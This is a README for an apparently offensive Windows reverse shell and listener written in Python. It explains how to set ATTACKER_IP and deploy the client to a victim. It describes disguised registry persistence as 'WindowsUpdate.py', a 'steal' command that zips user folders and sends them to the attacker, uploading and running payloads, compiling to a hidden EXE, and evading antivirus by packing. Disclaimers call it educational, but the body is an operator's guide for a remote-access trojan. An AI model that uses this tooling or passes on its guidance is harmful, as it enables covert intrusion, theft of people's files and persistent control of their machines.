# 🖥️ Windows Reverse Shell (Advanced)

A fully-featured reverse shell for Windows systems, designed for **authorized penetration testing** and **educational purposes**.

It includes persistence, file transfer, data exfiltration (`steal`), popup alerts, and an encrypted command channel.

> ⚠️ **DISCLAIMER**
> This tool is intended **only** for ethical hacking, CTF competitions, and security research with **explicit written permission**. Unauthorized access to computer systems is illegal. The author assumes no responsibility for misuse.

---

## 📑 Table of Contents

* [Features](#features)
* [Requirements](#requirements)
* [Quick Start](#quick-start)
* [Available Commands](#available-commands)
* [Detailed Functionality](#detailed-functionality)
* [Practical Examples](#practical-examples)
* [Troubleshooting](#troubleshooting)
* [Customization](#customization)
* [FAQ](#faq)
* [License & Legal](#license--legal)

---

## ✨ Features

* Reverse TCP connection with auto-reconnect (every 5 seconds)
* XOR encryption for basic traffic obfuscation
* Windows persistence via registry (`HKCU\Run`)
* File upload & download (base64 encoded)
* `steal` command (automated data exfiltration)
* Popup alerts (`alert`)
* System status overview (`status`)
* Full command execution (cmd + PowerShell)
* Improved listener (colored prompt, local commands, auto file saving)

---

## ⚙️ Requirements

### Attacker (Listener)

* Python 3.6+
* Linux / macOS / Windows
* Open inbound port (default: `4444`) or tunnel (ngrok / VPS)

### Victim (Client)

* Windows 7/8/10/11
* Python 3 (or compiled `.exe`)
* Network connectivity to attacker

---

## 🚀 Quick Start

### 1. Configure Attacker IP

Edit `victim_win.py`:

```python
ATTACKER_IP = "192.168.1.100"  # Replace with your IP
ATTACKER_PORT = 4444
```

---

### 2. Start Listener (Attacker)

```bash
python3 listener.py
```

Expected output:

```
[*] Listening on 0.0.0.0:4444...
```

---

### 3. Deploy Client (Victim)

```bash
python victim_win.py
```

On successful connection:

```
[+] Connection received from 192.168.1.50:54321
[+] Connected from user@HOSTNAME in C:\Users\user
shell>
```

---

## 🧠 Available Commands

### System Commands

Any unknown command is executed via `cmd.exe`:

```
shell> whoami
shell> dir C:\
shell> ipconfig /all
shell> powershell -c "Get-Process"
```

---

### Built-in Commands

| Command         | Description                       |
| --------------- | --------------------------------- |
| help            | Show commands                     |
| exit            | Close connection (auto-reconnect) |
| kill            | Terminate client permanently      |
| cd <path>       | Change directory                  |
| download <file> | Download file                     |
| upload <file>   | Upload file                       |
| persist         | Install persistence               |
| steal           | Exfiltrate user files             |
| alert <msg>     | Show popup                        |
| status          | System info                       |

---

### Listener Local Commands

Prefix with `!`:

```
shell> !ls
shell> !pwd
```

---

## 🔍 Detailed Functionality

### Persistence (`persist`)

* Copies itself to:

  ```
  %APPDATA%\WindowsUpdate.py
  ```
* Adds registry key:

  ```
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  ```
* Uses `pythonw.exe` (no visible window)

---

### File Transfer

#### Download

```
shell> download C:\file.txt
```

#### Upload

```
shell> upload payload.exe
```

* Uses base64 encoding
* Chunk-based transfer
* Auto reconstruction

---

### Data Exfiltration (`steal`)

* Targets:

  * Desktop
  * Downloads
  * Pictures
  * Videos

* Process:

  1. Collect files
  2. Zip archive in `%TEMP%`
  3. Send to attacker
  4. Delete temp file

---

### Popup Alerts (`alert`)

```
shell> alert Your system is compromised
```

* Uses PowerShell MessageBox
* Fallback: `msg` command

---

### System Status (`status`)

```
shell> status
```

Output:

```
User: user
Host: HOSTNAME
Directory: C:\Users\user
Local IP: 192.168.1.50
```

---

## 🧪 Practical Examples

### Exfiltrate Files

```
shell> steal
```

---

### Upload & Execute Payload

```
shell> upload payload.exe
shell> payload.exe
```

---

### Gather System Info

```
shell> systeminfo > info.txt
shell> download info.txt
```

---

### Alert + Logoff

```
shell> alert Maintenance required
shell> shutdown /l /f
```

---

## 🛠️ Troubleshooting

| Issue              | Solution                      |
| ------------------ | ----------------------------- |
| Connection refused | Check IP/port & firewall      |
| No shell prompt    | XOR key mismatch              |
| Empty output       | Try `cmd /c` or PowerShell    |
| Large file fails   | Split file                    |
| steal fails        | Permissions / missing folders |
| Persistence fails  | Needs proper privileges       |

---

## 🔧 Customization

* Change XOR key → `XOR_KEY`
* Add folders → edit `steal_files()`
* Reconnect delay → `RECONNECT_DELAY`
* Change port → `ATTACKER_PORT`

### Compile to EXE

```bash
pyinstaller --onefile --noconsole victim_win.py
```

---

## ❓ FAQ

**Q: Works on Linux/macOS?**
A: Client is Windows-only. Listener works everywhere.

**Q: Detectable by AV?**
A: Yes. Obfuscation or packing may help.

**Q: Stop client permanently?**
A: Use `kill` or remove registry entry.

**Q: Internet usage?**
A: Yes (VPS / ngrok).

---

## ⚖️ License & Legal

Educational use only.
No liability for misuse.
Always obtain proper authorization.

---

## 🧠 Final Note

If you deploy this without permission, you're not a pentester — you're just committing a crime.

Use responsibly.
